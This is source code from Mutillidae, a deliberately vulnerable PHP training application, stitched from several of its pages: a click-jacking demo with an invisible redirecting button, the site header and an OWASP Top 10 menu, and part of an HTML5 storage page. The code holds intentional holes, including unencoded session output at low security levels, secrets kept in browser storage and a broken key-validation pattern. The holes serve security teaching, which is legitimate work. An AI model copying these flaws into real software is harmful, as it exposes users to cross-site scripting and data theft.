	<tr><td>Starting with the mouse off of the picture, move the mouse over the picture, then click to enlarge a portion of the picture.</td></tr>
</table>

<iframe
	id="id-iframe" 
	frameborder="0"
	scrolling="no" 
	width="500px" 
	height="600px" 
	src="index.php?page=rene-magritte.php" 
	style="margin-left:auto; margin-right:auto;"
	>
</iframe>

<div id="id-hover-div" class="click-jacking-button"
onclick="window.alert('This page has been hijacked by the Mutillidae development team.');document.location.href='http://www.irongeek.com';"
>
Giant Invisible Click-Jacking Button 
</div>

<script>
	objHoverDiv = document.getElementById('id-hover-div');
</script>
	<?php
	if($_SESSION['loggedin'] == "True"){

		switch ($_SESSION["security-level"]){
	   		case "0": // This code is insecure
	   		case "1": // This code is insecure
	   			// DO NOTHING: This is equivalent to using client side security		
				$logged_in_user = $_SESSION['logged_in_user'];
				$logged_in_usersignature = $_SESSION['logged_in_usersignature'];
	   		break;
		    
	   		case "2":
	   		case "3":
	   		case "4":
	   		case "5": // This code is fairly secure
	  			/* 
	  			 * NOTE: Input validation is excellent but not enough. The output must be
	  			 * encoded per context. For example, if output is placed in HTML,
	  			 * then HTML encode it. Blacklisting is a losing proposition. You 
	  			 * cannot blacklist everything. The business requirements will usually
	  			 * require allowing dangerous charaters. In the example here, we can 
	  			 * validate username but we have to allow special characters in passwords
	  			 * least we force weak passwords. We cannot validate the signature hardly 
	  			 * at all. The business requirements for text fields will demand most
	  			 * characters. Output encoding is the answer. Validate what you can, encode it
	  			 * all.
	  			 */
	   			// encode the entire message following OWASP standards
	   			// this is HTML encoding because we are outputting data into HTML
				$logged_in_user = $Encoder->encodeForHTML($_SESSION['logged_in_user']);
				$logged_in_usersignature = $Encoder->encodeForHTML($_SESSION['logged_in_usersignature']);
	   		break;
	   	}// end switch		

	   	$lUserAuthorizationLevelText = 'User';
	   	if ($_SESSION['is_admin'] == 'TRUE'){
	   		$lUserAuthorizationLevelText = 'Admin';
	   	}// end if

		$message = "Logged In " . $lUserAuthorizationLevelText . ": " . $logged_in_user . " (" . $logged_in_usersignature . ")";	   	
	   	
	} else {
		$logged_in_user = "anonymous";
		$message = "Not Logged In";
	}// end if
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/loose.dtd">
<html>
<head>
	<meta content="text/html; charset=us-ascii" http-equiv="content-type">

	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
	<link rel="stylesheet" type="text/css" href="./styles/global-styles.css" />
	<link rel="stylesheet" type="text/css" href="./styles/ddsmoothmenu/ddsmoothmenu.css" />
	<link rel="stylesheet" type="text/css" href="./styles/ddsmoothmenu/ddsmoothmenu-v.css" />

	<script type="text/javascript" src="./javascript/bookmark-site.js"></script>
	<script type="text/javascript" src="./javascript/ddsmoothmenu/ddsmoothmenu.js"></script>
	<script type="text/javascript" src="./javascript/ddsmoothmenu/jquery.min.js">
		/***********************************************
		* Smooth Navigational Menu- (c) Dynamic Drive DHTML code library (www.dynamicdrive.com)
		* This notice MUST stay intact for legal use
		* Visit Dynamic Drive at http://www.dynamicdrive.com/ for full source code
		***********************************************/
	</script>
	<script type="text/javascript">
		ddsmoothmenu.init({
			mainmenuid: "smoothmenu1", //menu DIV id
			orientation: 'v', //Horizontal or vertical menu: Set to "h" or "v"
			classname: 'ddsmoothmenu', //class added to menu's outer DIV
			//customtheme: ["#cccc44", "#cccccc"],
			contentsource: "markup" //"markup" or ["container_id", "path_to_menu_file"]
		});
	</script>

	<script type="text/javascript">
		var onLoadOfBody = function(theBody){
			var l_securityLevel = '<?php echo $_SESSION["security-level"]; ?>';
			<?php /*var l_loginMessage = '<?php echo $message ?>';*/?>
			var l_hintsStatus = '<?php echo $_SESSION["hints-enabled"] ?>';
			
			switch(l_securityLevel){
				case "0": var l_securityLevelDescription = 'Hosed'; break;
				case "1": var l_securityLevelDescription = 'Arrogent'; break;
				case "2": var l_securityLevelDescription = '2'; break;
				case "3": var l_securityLevelDescription = '3'; break;
				case "4": var l_securityLevelDescription = '4'; break;
				case "5": var l_securityLevelDescription = 'Secure'; break; 
			}// end switch
			//document.getElementById("idSystemInformationHeading").innerHTML = l_loginMessage;
			document.getElementById("idHintsStatusHeading").innerHTML = 'Hints: ' + l_hintsStatus;
			document.getElementById("idSecurityLevelHeading").innerHTML = 'Security Level: ' + l_securityLevel + ' (' + l_securityLevelDescription + ')';
		}// end function onLoadOfBody()
	</script>
</head>
<body onload="onLoadOfBody(this);">
<table class="main-table-frame" border="1px" cellspacing="0px" cellpadding="0px">
	<tr>
		<td bgcolor="#ccccff" align="center" colspan="7">
			<table width="100%">
				<tr>
					<td style="text-align:center;">
						<span style="text-align:center; font-weight: bold; font-size:30px; text-align: center;">
						<img style="vertical-align: middle; margin-right: 25px;" border="0px" width="75px" height="50px" align="top" src="./images/coykillericon.png"/>
							Mutillidae: Born to be Hacked
						</span>
					</td>
				</tr>		
			</table>
		</td>
	</tr>
	<tr>
		<td bgcolor="#ccccff" align="center" colspan="7">
			<?php /* Note: $C_VERSION_STRING in index.php */ ?>
			<span class="version-header"><?php echo $C_VERSION_STRING;?></span>
			<span id="idSecurityLevelHeading" class="version-header" style="margin-left: 40px;"></span>
			<span id="idHintsStatusHeading" class="version-header" style="margin-left: 40px;"></span>
			<span id="idSystemInformationHeading" class="version-header" style="margin-left: 40px;"><?php echo $message ?></span>
		</td>
	</tr>
	<tr>
		<td colspan="2" class="header-menu-table">
			<table class="header-menu-table">
				<tr>
					<td><a href="index.php?page=home.php">Home</a></td>
					<td>
						<?php
							if ($_SESSION['loggedin'] == 'True'){
								echo '<a href="./index.php?do=logout">Logout</a>';
							} else {
								echo '<a href="./index.php?page=login.php">Login/Register</a>';
							}// end if
						?>		
					</td>
					<?php 
						if ($_SESSION['security-level'] == 0){
							echo '<td><a href="./index.php?do=toggle-hints&page='.$lPage.'">Toggle Hints</a></td>';
						}// end if
					?>
					<td><a href="./index.php?do=toggle-security&page=<?php echo $lPage?>">Toggle Security</a></td>
					<td><a href="set-up-database.php">Reset DB</a></td>
					<td><a href="./index.php?page=show-log.php">View Log</a></td>
					<td><a href="./index.php?page=captured-data.php">View Captured Data</a></td>
				</tr>
			</table>	
		</td>
	</tr>
	<tr>
		<td style="vertical-align:top;text-align:left;background-color:#ccccff;width:10%">
		<div id="smoothmenu1" class="ddsmoothmenu">
			<ul>
				<li style="border-color: #ffffff;border-style: solid;border-width: 1px">
					<a href="#">Core Controls</a>
					<ul>
						<li><a href="index.php?page=home.php">Home</a></li>
					  	<li>
					  		<?php
								if ($_SESSION['loggedin'] == 'True'){
									echo '<a href="./index.php?do=logout">Logout</a>';
								} else {
									echo '<a href="./index.php?page=login.php">Login/Register</a>';
								}// end if
							?>
						</li>
						<li><a href="./index.php?do=toggle-security&page=<?php echo $lPage?>">Toggle Security</a></li>
						<li><a href="set-up-database.php">Setup/Reset the DB</a></li>
						<li><a href="./index.php?page=show-log.php">Show Log</a></li>
						<li><a href="./index.php?page=credits.php">Credits</a></li>
					</ul>
				</li>
				<li style="border-color: #ffffff;border-style: solid;border-width: 1px">
					<a href="#">OWASP Top 10</a>
					<ul>
						<li>
							<a href="http://www.owasp.org/index.php/Top_10_2010-A1" target="_blank">A1 - Injection</a>
							<ul>
								<li>
									<a href="">SQLi - Extract Data</a>
									<ul>
										<li><a href="./index.php?page=user-info.php">User Info</a></li>
									</ul>
								</li>
								<li>
									<a href="">SQLi - Bypass Authentication</a>
									<ul>
										<li><a href="./index.php?page=login.php">Login</a></li>
									</ul>
								</li>
								<li>
									<a href="">SQLi - Insert Injection</a>
									<ul>
										<li><a href="./index.php?page=register.php">Register</a></li>
									</ul>
								</li>
								<li>
									<a href="">Blind SQL via Timing</a>
									<ul>
										<li><a href="./index.php?page=login.php">Login</a></li>
										<li><a href="./index.php?page=user-info.php">User Info</a></li>
									</ul>
								</li>
								<li>
									<a href="">SQLMAP Practice Target</a>
									<ul>
										<li><a href="./index.php?page=view-someones-blog.php">View Someones Blog</a></li>
										<li><a href="./index.php?page=user-info.php">User Info</a></li>
									</ul>
								</li>
								<li>
									<a href="">HTML Injection (HTMLi)</a>
									<ul>
										<li><a href="?page=add-to-your-blog.php">Add to your blog</a></li>
									</ul>
								</li>
								<li>
									<a href="">HTMLi via HTTP Headers</a>
									<ul>
										<li><a href="./index.php?page=site-footer-xss-discussion.php">Site Footer</a><li>
										<li><a href="">HTTP Response Splitting (Hint: Difficult)</a></li>
									</ul>
								</li>
								<li>
									<a href="">HTMLi Via DOM Injection</a>
									<ul>
										<li><a href="index.php?page=html5-storage.php">HTML5 Storage</a></li>
									</ul>
								</li>								
								<li>
									<a href="">HTMLi Via Cookie Injection</a>
									<ul>
										<li><a href="index.php?page=capture-data.php">Capture Data Page</a></li>
									</ul>
								</li>
								<li>
									<a href="">Command Injection</a>
									<ul>
										<li><a href="./index.php?page=dns-lookup.php">DNS Lookup</a></li>
									</ul>
								</li>
								<li>
									<a href="">JavaScript Injection</a>
									<ul>
										<li><a href="./index.php">Those "Back" Buttons</a></li>
										<li>
											<a href="./index.php?page=password-generator.php&username=<?php echo $logged_in_user ?>">
												Password Generator
											</a>
										</li>
									</ul>
								</li>
								<li>
									<a href="">HTTP Parameter Pollution</a>
									<ul>
										<li><a href="./index.php?page=user-poll.php">Poll Question</a></li>
									</ul>
								</li>
								<li>
									<a href="">Cascading Style Injection</a>
									<ul>
										<li><a href="./index.php?page=set-background-color.php">Set Background Color</a></li>
									</ul>
								</li>
								<li>
									<a href="">JavaScript Object Notation (JSON) Injection</a>
									<ul>
										<li><a href="./index.php?page=pen-test-tool-lookup.php">Pen Test Tool Lookup</a></li>
									</ul>
								</li>
							</ul>
						</li>
						<li>
							<a href="http://www.owasp.org/index.php/Top_10_2010-A2" target="_blank">A2 - Cross Site Scripting (XSS)</a>
							<ul>
								<li>
									<a href="">Reflected (First Order)</a>
									<ul>
										<li><a href="./index.php?page=dns-lookup.php">DNS Lookup</a></li>
										<li><a href="./index.php?page=pen-test-tool-lookup.php">Pen Test Tool Lookup</a></li>
										<li><a href="./index.php?page=text-file-viewer.php">Text File Viewer</a></li>
										<li><a href="./index.php?page=user-info.php">User Info</a></li>
										<li><a href="./index.php?page=set-background-color.php">Set Background Color</a></li>
										<li><a href="./index.php?page=html5-storage.php">HTML5 Storage</a></li>
										<li><a href="./index.php?page=capture-data.php">Capture Data Page</a></li>
									</ul>
								</li>
								<li>
									<a href="">Persistent (Second Order)</a>
									<ul>
										<li><a href="?page=add-to-your-blog.php">Add to your blog</a></li>
										<li><a href="?page=view-someones-blog.php">View someone's blog</a></li>
										<li><a href="?page=show-log.php">Show Log</a><li>
									</ul>
								</li>
								<li>
									<a href="">DOM Injection</a>
									<ul>
										<li><a href="index.php?page=html5-storage.php">HTML5 Storage</a></li>
									</ul>
								</li>								
								<li>
									<a href="">Via "Input" (GET/POST)</a>
									<ul>
										<li><a href="?page=add-to-your-blog.php">Add to your blog</a></li>
										<li><a href="?page=view-someones-blog.php">View someone's blog</a></li>
										<li><a href="?page=show-log.php">Show Log</a><li>
										<li><a href="?page=text-file-viewer.php">Text File Viewer</a></li>
										<li><a href="./index.php?page=dns-lookup.php">DNS Lookup</a></li>
										<li><a href="?page=user-info.php">User Info</a></li>
										<li><a href="./index.php">Missing HTTPOnly Attribute</a></li>
										<li><a href="./index.php?page=set-background-color.php">Set Background Color</a></li>
										<li><a href="./index.php?page=pen-test-tool-lookup.php">Pen Test Tool Lookup</a></li>
									</ul>
								</li>
								<li>
									<a href="">Via HTTP Headers</a>
									<ul>
										<li><a href="./index.php?page=browser-info.php">Browser Info</a></li>
										<li><a href="./index.php?page=show-log.php">Show Log</a><li>
										<li><a href="./index.php?page=site-footer-xss-discussion.php">Site Footer</a><li>
										<li><a href="./index.php?page=html5-storage.php">Those &quot;BACK&quot; Buttons</a></li>
									</ul>
								</li>
								<li>
									<a href="">Via Misconfiguration</a>
									<ul>
										<li><a href="./index.php">Missing HTTPOnly Attribute</a></li>
									</ul>
								</li>
								<li>
									<a href="">Against HTML 5 Storage</a>
									<ul>
										<li><a href="index.php?page=html5-storage.php">HTML5 Storage</a></li>
									</ul>
								</li>
								<li>
									<a href="">Against JSON</a>
									<ul>
										<li><a href="./index.php?page=pen-test-tool-lookup.php">Pen Test Tool Lookup</a></li>
									</ul>
								</li>
								<li>
									<a href="">Via Cookie Injection</a>
									<ul>
										<li><a href="index.php?page=capture-data.php">Capture Data Page</a></li>
									</ul>
								</li>					
							</ul>
						</li>
						<li>
							<a href="http://www.owasp.org/index.php/Top_10_2010-A3" target="_blank">
								A3 - Broken Authentication and Session Management
							</a>
							<ul>
								<li><a href="index.php">Cookies</a></li>
								<li><a href="?page=login.php">Login</a></li>
							</ul>
						</li>
						<li>
							<a href="http://www.owasp.org/index.php/Top_10_2010-A4" target="_blank">A4 - Insecure Direct Object References</a>
							<ul>
								<li><a href="index.php?page=text-file-viewer.php">Text File Viewer</a></li>
								<li><a href="index.php?page=source-viewer.php">Source Viewer</a></li>
								<li><a href="index.php?page=credits.php">Credits</a></li>
								<li><a href="index.php">Cookies</a></li>
								<li><a href="index.php?page=arbitrary-file-inclusion.php">Arbitrary File Inclusion</a></li>
							</ul>
						</li>
						<li>
							<a href="http://www.owasp.org/index.php/Top_10_2010-A5" target="_blank">A5 - Cross Site Request Forgery (CSRF)</a>
							<ul>
								<li><a href="index.php?page=add-to-your-blog.php">Add to your blog</a></li>
								<li><a href="./index.php?page=register.php">Register User</a></li>
							</ul>
						</li>
						<li>
							<a href="http://www.owasp.org/index.php/Top_10_2010-A6" target="_blank">A6 - Security Misconfiguration</a>
							<ul>
								<li><a href="index.php?page=home.php">Directory Browsing</a></li>
								<li><a href="./index.php?page=user-info.php">GET for POST</a></li>
							</ul>
						</li>
						<li>
							<a href="http://www.owasp.org/index.php/Top_10_2010-A7" target="_blank">A7 - Insecure Cryptographic Storage</a>
							<ul>
								<li><a href="index.php?page=user-info.php">User Info</a></li>
								<li><a href="index.php?page=html5-storage.php">HTML5 Storage</a></li>
							</ul>
						</li>
						<li>
							<a href="http://www.owasp.org/index.php/Top_10_2010-A8" target="_blank">A8 - Failure to Restrict URL Access</a>
							<ul>
								<li><a href="index.php?page=secret-administrative-pages.php">"Secret" Administrative Pages</a></li>
								<li><a href="http://en.wikipedia.org/wiki/Robots_exclusion_standard">Robots.txt</a></li>
							</ul>
						</li>
						<li>
							<a href="http://www.owasp.org/index.php/Top_10_2010-A9" target="_blank">A9 - Insufficient Transport Layer Protection</a>
							<ul>
								<li><a href="?page=login.php">Login</a></li>
								<li><a href="?page=user-info.php">User Info</a></li>
							</ul>
						</li>
						<li>
							<a href="http://www.owasp.org/index.php/Top_10_2010-A10" target="_blank">A10 - Unvalidated Redirects and Forwards</a>
							<ul>
								<li><a href="?page=credits.php">Credits</a></li>
								<?php if (isset($_COOKIE["uid"]) && $_COOKIE["uid"]==1) { ?>		
								<li><a href="set-up-database.php">Setup/reset the DB</a></li>
								<?php } else { ?>
								<a href="#">Setup/reset the DB (Disabled: Not Admin)</a></li>
								<?php }; ?>		
							</ul>
						</li>
					</ul>
				</li>
				<li style="border-color: #ffffff; border-style: solid;border-width: 1px">
					<a href="#">Others</a>
					<ul>
						<li>
							<a href="http://www.owasp.org/index.php/Top_10_2007-A3" target="_blank">OWASP 2007 A3 - Malicious File Execution</a>
							<ul>
								<li><a href="?page=text-file-viewer.php">Text File Viewer</a></li>
								<li><a href="?page=source-viewer.php">Source Viewer</a></li>
							</ul>		
						</li>
						<li>
							<a href="http://www.owasp.org/index.php/Top_10_2007-A6" target="_blank">OWASP 2007 A6 - Information Leakage and Improper Error Handling</a>
							<ul>
								<li><a href="index.php">Cache Control</a></li>
								<li><a href="index.php">X-Powered-By HTTP Header</a></li>
								<li><a href="index.php">HTML/JavaScript Comments</a></li>
								<li><a href="index.php?page=framing.php">Click-Jacking</a></li>
								<li><a href="framer.html">Cross-Site Framing (Third-Party Framing)</a></li>
								<li><a href="index.php?page=html5-storage.php">HTML5 Storage</a></li>
							</ul>		
						</li>
						<li>
							<a href="">Denial of Service</a>
							<ul>
								<li><a href="?page=text-file-viewer.php">Text File Viewer</a></li>
								<li><a href="?page=show-log.php">Show Web Log</a><li>
							</ul>		
						</li>
						<li>
							<a href="">JavaScript "Security"</a>
							<ul>
								<li><a href="index.php?page=login.php">Login</a></li>
								<li><a href="index.php?page=add-to-your-blog.php">Add to your blog</a></li>
								<li><a href="index.php?page=html5-storage.php">HTML5 Storage</a></li>
							</ul>		
						</li>
						<li>
							<a href="">Data Capture Pages</a>
							<ul>
								<li><a href="index.php?page=capture-data.php">Data Capture</a></li>
								<li><a href="index.php?page=captured-data.php">View Captured Data</a></li>
							</ul>		
						</li>
					</ul>
				</li>
				<li style="border-color: #ffffff;border-style: solid;border-width: 1px">
					<a href="#">Documentation</a>
					<ul>
						<li><a href="index.php?page=change-log.htm">Change Log</a></li>
						<li><a href="index.php?page=installation.php">Installation Instructions</a></li>
						<li><a href="/mutillidae/documentation/mutillidae-installation-on-xampp-win7.pdf">Installation Instructions: Windows 7 (PDF)</a></li>
						<li><a href="index.php?page=documentation/vulnerabilities.php">Listing of Vulnerabilities</a></li>
						<li>
							<a href="index.php?page=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php" target="_blank">
								How to Access Mutillidae over Virtual Box "Host Only" Network
							</a>
						</li>
					</ul>
				</li>
				<li style="border-color: #ffffff;border-style: solid;border-width: 1px">
					<a href="#">Resources</a>
					<ul>
						<li>
							<a onclick="bookmarkSite();" href="">
								Bookmark Site
							</a>
						</li>
						<li>
							<a href="https://www.owasp.org/index.php/Top_Ten" target="_blank">
								OWASP Top Ten
							</a>
						</li>
						<li>
							<a href="http://samurai.inguardians.com/" target="_blank">
								Samurai Web Testing Framework
							</a>
						</li>
						<li>
							<a href="https://addons.mozilla.org/en-US/firefox/collections/jdruin/pro-web-developer-qa-pack/" target="_blank">
								Professional Web Application Developer Quality Assurance Pack
							</a>
						</li>
						<li>
							<a href="http://www.irongeek.com/i.php?page=security/mutillidae-deliberately-vulnerable-php-owasp-top-10" target="_blank">
								Latest Version of Mutillidae
							</a>
						</li>
						
						<li>
							<a href="http://www.hackersforcharity.org/ghdb/" target="_blank">
								Google Hacking Database
							</a>
						</li>	
					</ul>
				</li>
			</ul>
			<br style="clear: left" />
		</div>
		<div style="text-align: center;">
			<a href="https://www.owasp.org" target="_blank">
				<img alt="OWASP" style="border-width: 0px;" height="120px" width="160px" src="./images/owasp-logo-400-300.png" />
			</a>
		</div>
		<div class="label" style="text-align: center;">
			Site hacked...err...quality-tested with Samurai WTF, Backtrack, Firefox, Burp-Suite, Netcat, and 
			<a href="https://addons.mozilla.org/en-US/firefox/collections/jdruin/pro-web-developer-qa-pack/" style="text-decoration: none;">
			these Mozilla Add-ons
			</a>
		</div>
		<div>&nbsp;</div>
		<div>&nbsp;</div>
		<div class="label" style="text-align: center;">
			<a href="https://twitter.com/webpwnized" style="text-decoration: none;" target="_blank">
				<img align="middle" alt="Twitter" src="./images/twitter.gif" width="52px" height="35px" />
				<br/>
				@webpwnized
			</a>
		</div>		
		<div>&nbsp;</div>
		<div class="label" style="text-align: center;">
			<a href="http://www.youtube.com/user/webpwnized" style="text-decoration: none; white-space:nowrap;" target="_blank">
				<img align="middle" alt="YouTube" src="./images/youtube_256_256.png" width="56px" height="56px" />
				<br/>
				Mutillidae<br/>Channel
			</a>
		</div>		
		<div>&nbsp;</div>
		<div class="label" style="text-align: center;">Developed by Adrian &quot;<a href="http://www.irongeek.com">Irongeek</a>&quot; Crenshaw and Jeremy Druin</div>
	</td>

<td valign="top">
	<blockquote>
	<!-- Begin Content -->
<div class="page-title" style="padding:10px;width:75%;margin-left:auto;margin-right:auto;text-align:center;">Mutillidae: Deliberately Vulnerable PHP Scripts Of OWASP Top 10</div>

<div style="font-family: Arial;">

	<p class="label">Latest Version / Installation</p>
	<ul>
		<li><a class="label" style="text-decoration: none;" href="http://www.irongeek.com/i.php?page=security/mutillidae-deliberately-vulnerable-php-owasp-top-10" target="_blank">Latest Version</a></li>
		<li><a class="label" style="text-decoration: none;" href="./index.php?page=installation.php">Installation Instructions</a></li>
		<li><a class="label" style="text-decoration: none;" href="./index.php?page=usage-instructions.php">Usage Instructions</a></li>
		<li><a class="label" style="text-decoration: none;" href="./index.php?page=php-errors.php">Get rid of those pesky PHP errors</a></li>		
		<li><a class="label" style="text-decoration: none;" href="./index.php?page=change-log.htm">Change Log</a></li>
		<li><a class="label" style="text-decoration: none;" href="./index.php?page=notes.php">Notes</a></li>		
	</ul>
	
	<div style="text-align: center;margin-left: auto; margin-right: auto;">
		<div>&nbsp;</div>
		<table>
			<tr>
				<td colspan="2" style="text-align: center;" class="report-header">
					Samurai WTF and Backtrack contains all the tools needed or you may build your own collection	
				</td>
			</tr>
			<tr>
				<td>
					<a href="http://www.backtrack-linux.org/" target="_blank">
						<img alt="Backtrack" style="border-width:0px;" width="90px" height="69px" src="./images/backtrack-4-r2-logo-90-69.png" />
					</a>
				</td>
				<td>
					<a href="http://samurai.inguardians.com/" target="_blank">
						<img alt="Samurai Web Testing Framework" style="border-width:0px;" width="160px" height="107px" src="./images/samurai-wtf-logo-320-214.jpeg" />
					</a>
					<div class="label">Samurai Web Testing Framework</div>
				</td>
			</tr>
		</table>
		<div>
			<a href="http://www.eclipse.org/pdt/" target="_blank" style="margin-right:10px;">
				<img alt="Eclipse PDT" style="border-width: 0px;" height="100px" width="100px" src="./images/bui_eclipse_pos_logo_fc_med.jpg" />
			</a>
			<a href="http://www.php.net/" target="_blank" style="margin-left:30px;">
				<img alt="PHP-MySQL" style="border-width: 0px;" height="88px" width="100px" src="./images/php-mysql-logo-176-200.jpeg" />
			</a>
			<a href="http://www.quest.com/toad-for-mysql/" target="_blank" style="margin-left:30px;">
				<img alt="PHP-MySQL" style="border-width: 0px;" height="80px" width="77px" src="./images/toad-for-mysql-77-80.jpg" />
			</a>			
			<a href="http://www.hackersforcharity.org/" target="_blank" style="margin-left:30px;">
				<img alt="Hackers for Charity" style="border-width:0px;" width="256px" height="100px" src="./images/IhackBanner2x_final_print.jpg" />
			</a>
		</div>
	</div>
</div>

<?php
	if ($_SESSION["showhints"]){
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>Security Misconfiguration and Error Handling</b>
						  	This is not directly a vulnerability with the web app, but with 
						  	how it is installed or how the web server is configured. 
						  	Things to check for would be items like:
							</li>
							<li>1. Is the webserver software (Apache, IIS, etc) up to date?
							</li>
							<li>2. How about the libraries your application uses? Are they up to date? Problems could exist because of code you never wrote, but were included as a library.
							</li>
							<li>3. Is you web app running on a box with unneeded services? The web app may be fine, but some other vulnerable service could let someone in.
							</li>
							<li>4. Make sure you are not using default passwords.
							</li>
							<li>5. How does your server handle errors? Sometimes too much information is given back to the attacker via error message and banners. No reason to help out your attackers. Mutillidae has his issue in spades, just type a single quote into some of the forms to see what I mean.
							</li>
							<li>6. Some functions are rather dangerous. If the configuration was hardened many of the problems under "Malicious File Execution" would be harder to exploit since an attacker could not directly tell PHP to grab a file from an offsite URL.
							</li>
							<li>
							Also, depending on your application software stack, there could be a sorts of recommended ways to harden configuration. In the case of PHP, Madirish has a guide that may help: <a href="http://www.madirish.net/?article=229">http://www.madirish.net/?article=229</a>
							</li>
				  		</ul>
					</td>
				</tr>
			</table>'; 
	}// end if
// End hints section
?>
<?php 
	try {	    	
    	switch ($_SESSION["security-level"]){
    		case "0": // This code is insecure.
    			$lUseClientSideStorageForSensitiveData = TRUE;
    			$lUseJavaScriptValidation = FALSE;
    		break;

    		case "1": // This code is insecure.
    			$lUseClientSideStorageForSensitiveData = TRUE;
    			$lUseJavaScriptValidation = TRUE;
    		break;

	   		case "2":
	   		case "3":
	   		case "4":
    		case "5": // This code is fairly secure
    			$lUseClientSideStorageForSensitiveData = FALSE;
    			$lUseJavaScriptValidation = TRUE;
    		break;
    	}// end switch
	}catch(Exception $e){
		echo $CustomErrorHandler->FormatError($e, "Error setting up configuration on page html5-storage.php");
	}// end try	
	
	if($lUseClientSideStorageForSensitiveData){
		echo "<script type=\"text/javascript\" src=\"javascript/html5-secrets.js\"></script>";		
	}// end if
?>

<div class="page-title">HTML 5 Storage</div>

<?php include_once './includes/back-button.inc';?>

<!-- BEGIN HTML OUTPUT  -->
<script type="text/javascript">
	/* 
		The Storage interface of the browser API
	
		interface Storage {
			  readonly attribute unsigned long length;
			  DOMString? key(unsigned long index);
			  getter DOMString getItem(DOMString key);
			  setter creator void setItem(DOMString key, DOMString value);
			  deleter void removeItem(DOMString key);
			  void clear();
		};
	*/

	<?php 
		if ($lUseJavaScriptValidation){
			echo "var gUseJavaScriptValidation = \"TRUE\";";
		}else{
			echo "var gUseJavaScriptValidation = \"FALSE\";";
		}
	?>

	window.sessionStorage.setItem("CurrentBrowser", Navigator.userAgent);
	window.localStorage.setItem("MessageOfTheDay","Go Cats!");

	var addRow = function(pKey, pItem, pStorageType){
		try{
			var lDocRoot = window.document;
			var lTBody = lDocRoot.getElementById("idSessionStorageTableBody");
			var lTR = lDocRoot.createElement("tr");
			var lKeyTD = lDocRoot.createElement("td");
			var lItemTD = lDocRoot.createElement("td");
			var lTypeTD = lDocRoot.createElement("td");			
			var lBlankTD = lDocRoot.createElement("td");

			//lKeyTD.addAttribute("class", "label");
			lItemTD.style.textAlign = "center";
			lKeyTD.appendChild(lDocRoot.createTextNode(pKey));
			lItemTD.appendChild(lDocRoot.createTextNode(pItem));
			lTypeTD.appendChild(lDocRoot.createTextNode(pStorageType));
			lBlankTD.appendChild(lDocRoot.createTextNode(""));
			
			lTR.appendChild(lKeyTD);
			lTR.appendChild(lItemTD);
			lTR.appendChild(lTypeTD);
			lTR.appendChild(lBlankTD);
			lTBody.appendChild(lTR);
		}catch(/*Exception*/ e){
			alert("Error trying to add row in function addRow(): " + e.name + "-" + e.message);
		};// end try
	};//end JavaScript function addRow

	var setMessage = function(/* String */ pMessage){
		var lMessageSpan = document.getElementById("idAddItemMessageSpan");
		lMessageSpan.innerHTML = pMessage;
		lMessageSpan.setAttribute("class","success-message");
	};// end function setMessage

	var addItemToStorage = function(theForm){
		try{			
			var lKey = theForm.DOMStorageKey.value;
			var lItem = theForm.DOMStorageItem.value;
			var lType = "";
			var lUnacceptableKeyPattern = "[^A-Za-z0-9]*";

			//alert(lKey.match(lAcceptableKeyPattern));
			if (lKey.match(lUnacceptableKeyPattern)){
				setMessage("Unable to add key " + lKey.toString() + " because it contains non-alphanumeric characters");
				return false;
			}// end if

			if (gUseJavaScriptValidation == "TRUE"){
				var lInvalidTR = document.getElementById("id-invalid-input-tr");
				if(lKey.length == 0 || lItem.length == 0){
					lInvalidTR.style.display = "";
					return false;
				}else{
					lInvalidTR.style.display = "none";
				}// end if
			}// end if

			if(theForm.SessionStorageType[0].checked){
				window.sessionStorage.setItem(lKey, lItem);
				lType = "Session";
			}else if (theForm.SessionStorageType[1].checked){
				window.localStorage.setItem(lKey, lItem);
				lType = "Local";
			}// end if

			addRow(lKey, lItem, lType);
			setMessage("Added key " + lKey.toString() + " to " + lType.toString() + " storage");

		}catch(/*Exception*/ e){
			alert("Error in function addItemToStorage(): " + e.name + "-" + e.message);
		}// end try
	};// end JavaScript function

	var init = function(){
		var s = sessionStorage;
		var l = localStorage;
		var m = "";
				
		// grab local storage
		for(i=0;i<s.length;i++){
			var lKey = s.key(i);
			if(lKey.match(/^[^Secure]/)){addRow(lKey, s.getItem(lKey), "Session");};
		}
	
		// grab session storage
		for(i=0;i<l.length;i++){
			var lKey = l.key(i);
			if(lKey.match(/^[^Secure]/)){addRow(lKey, l.getItem(lKey), "Local");};
		}// end if

	};//end JavaScript function init
	
</script>

<form 	action="index.php?page=html5-storage.php" 
		method="post" 
		enctype="application/x-www-form-urlencoded" 
		onsubmit="return false;"
		id="idForm">		
	<table style="margin-left:auto; margin-right:auto; width: 600px;">
		<tr id="id-invalid-input-tr" style="display: none;">
			<td class="error-message">
				Error: Invalid Input - Both Key and Item are required fields
			</td>
		</tr>
		<tr>
			<td class="form-header">HTML 5 Web Storage</td>
		</tr>
		<tr><td>&nbsp;<td></tr>
	</table>
	<table style="margin-left:auto; margin-right:auto;">
		<tr>
			<td class="sub-header" colspan="3">Web Storage</td>
			<td>&nbsp;</td>
		</tr>
		<tr>
			<td class="sub-body">Key</td>
			<td class="sub-body">Item</td>
			<td class="sub-body">Storage Type</td>
			<td>&nbsp;</td><td>&nbsp;</td>
		</tr>
		<tbody id="idSessionStorageTableBody" style="font-weight:bold;"></tbody>
		<tr><td>&nbsp;</td></tr>
		<tr>
			<td><input type="text" id="idDOMStorageKeyInput" name="DOMStorageKey" size="20"></td>
			<td><input type="text" id="idDOMStorageItemInput" name="DOMStorageItem" size="20"></td>
			<td class="label">
				<input type="radio" name="SessionStorageType" value="Session" checked="checked" />Session
				<input type="radio" name="SessionStorageType" value="Local" />Local
			</td>
			<td>
				<input	onclick="addItemToStorage(this.form);" 
						class="button" 
						type="button" 
						value="Add New" />
			</td>
		</tr>
		<tr><td>&nbsp;</td></tr>
		<tfoot id="idSessionStorageTableFooter">
			<tr><th colspan="5"><span id="idAddItemMessageSpan"></span></th></tr>
			<tr><td>&nbsp;</td></tr>
		</tfoot>
	</table>
</form>
<div style="margin-left:auto; margin-right:auto; width:600px;">
	<span title="Click to delete session storage" onclick='sessionStorage.clear(); var node=window.document.getElementById("idSessionStorageTableBody"); while(node.hasChildNodes()){node.removeChild(node.firstChild)}; init();' style="cursor: pointer;" >
		<img height="24px" width="24px" src="./images/delete-icon-256-256.png" style="vertical-align: middle;" />
